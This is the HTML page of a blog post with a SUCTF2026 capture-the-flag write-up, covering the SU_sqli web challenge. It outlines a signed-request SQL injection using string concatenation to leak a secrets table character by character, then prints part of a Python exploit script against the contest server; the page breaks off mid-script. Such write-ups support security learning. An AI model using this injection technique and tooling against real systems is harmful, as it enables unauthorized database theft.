@@ -1,0 +1,955 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="xiaolaisec">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://laijunyue.github.io/2026/03/16/suctf2026 wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="WEBSU_sqli请求 &#x2F;api&#x2F;sign 调用本地的 su_sqli_signer.js 生成合法签名 利用 &#39; || (...) || &#39; 字符串拼接注入 先探测 posts 再探测已确认存在的 secrets 表 自动逐字符泄露可用列内容 EXP12345678910111213141516171819202122232425262728293031323334353637">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF2026 WP">
+<meta property="og:url" content="http://laijunyue.github.io/2026/03/16/SUCTF2026%20WP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WEBSU_sqli请求 &#x2F;api&#x2F;sign 调用本地的 su_sqli_signer.js 生成合法签名 利用 &#39; || (...) || &#39; 字符串拼接注入 先探测 posts 再探测已确认存在的 secrets 表 自动逐字符泄露可用列内容 EXP12345678910111213141516171819202122232425262728293031323334353637">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:\blog\xiaolaisecBlog\source\images\image-20260314111133319.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20260314152449006.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20260314152637943.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20260314152707248.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20260314160155587.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20260314160059420.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20260314140732229.png">
+<meta property="article:published_time" content="2026-03-16T13:32:24.000Z">
+<meta property="article:modified_time" content="2026-03-30T01:56:44.290Z">
+<meta property="article:author" content="xiaolaisec">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:\blog\xiaolaisecBlog\source\images\image-20260314111133319.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/background.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/background.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/background.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            SUCTF2026 WP -
+        
+        Welcome to xiaolaisec&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Welcome to xiaolaisec&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background.jpg","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["欢迎来到我的博客(｡･∀･)ﾉﾞ","悟已往之不谏，知来者之可追...","随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Welcome to xiaolaisec&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">22</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">45</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">SUCTF2026 WP</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/xiaolai.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-03-16 21:32:24</span>
+        <span class="mobile">2026-03-16 21:32:24</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-03-30 09:56:44</span>
+            <span class="mobile">2026-03-30 09:56:44</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SU-sqli"><a href="#SU-sqli" class="headerlink" title="SU_sqli"></a>SU_sqli</h2><p>请求 <code>/api/sign</code></p>
+<p>调用本地的 <code>su_sqli_signer.js</code> 生成合法签名</p>
+<p>利用 <strong><code>&#39; || (...) || &#39;</code> 字符串拼接注入</strong></p>
+<p>先探测 <code>posts</code></p>
+<p>再探测已确认存在的 <strong><code>secrets</code></strong> 表</p>
+<p>自动逐字符泄露可用列内容</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;http://101.245.108.250:10002&quot;</span></span><br><span class="line">WASM_DIR = <span class="string">&quot;./application&quot;</span></span><br><span class="line">SIGNER = <span class="string">&quot;su_sqli_signer.js&quot;</span></span><br><span class="line"></span><br><span class="line">UA = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">PROBE = <span class="string">&quot;https://example.com/probe.png&quot;</span></span><br><span class="line"></span><br><span class="line">TIMEOUT = <span class="number">15</span></span><br><span class="line">RETRY = <span class="number">6</span></span><br><span class="line">SLEEP_BETWEEN_RETRY = <span class="number">1.2</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand_noise</span>(<span class="params">n=<span class="number">16</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    alphabet = string.ascii_lowercase + string.digits</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;zz_&quot;</span> + <span class="string">&quot;&quot;</span>.join(random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qstr</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把字符串转成 chr(x)||chr(y)||...，避免直接出现敏感字面量。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;||&quot;</span>.join(<span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>)&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_json</span>(<span class="params">method: <span class="built_in">str</span>, url: <span class="built_in">str</span>, **kwargs</span>):</span><br><span class="line">    last_err = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(RETRY):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = sess.request(method, url, timeout=TIMEOUT, **kwargs)</span><br><span class="line">            <span class="keyword">if</span> r.status_code &gt;= <span class="number">500</span>:</span><br><span class="line">                last_err = RuntimeError(<span class="string">f&quot;<span class="subst">&#123;r.status_code&#125;</span> Server Error: <span class="subst">&#123;r.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">                time.sleep(SLEEP_BETWEEN_RETRY)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> r.status_code, r.json()</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">return</span> r.status_code, &#123;<span class="string">&quot;raw&quot;</span>: r.text&#125;</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last_err = e</span><br><span class="line">            time.sleep(SLEEP_BETWEEN_RETRY)</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;request failed after retries: <span class="subst">&#123;last_err&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sign_material</span>():</span><br><span class="line">    code, obj = request_json(<span class="string">&quot;GET&quot;</span>, TARGET + <span class="string">&quot;/api/sign&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;/api/sign status=<span class="subst">&#123;code&#125;</span>, body=<span class="subst">&#123;obj&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">or</span> <span class="keyword">not</span> obj.get(<span class="string">&quot;ok&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;/api/sign bad response: <span class="subst">&#123;obj&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> obj[<span class="string">&quot;data&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_q</span>(<span class="params">q: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;调用本地 Node/WASM signer，返回 /api/query 所需 body。&quot;&quot;&quot;</span></span><br><span class="line">    material = get_sign_material()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tempfile.NamedTemporaryFile(<span class="string">&quot;w+&quot;</span>, delete=<span class="literal">False</span>, suffix=<span class="string">&quot;.json&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        out = fp.name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = [</span><br><span class="line">            <span class="string">&quot;node&quot;</span>,</span><br><span class="line">            SIGNER,</span><br><span class="line">            WASM_DIR,</span><br><span class="line">            q,</span><br><span class="line">            material[<span 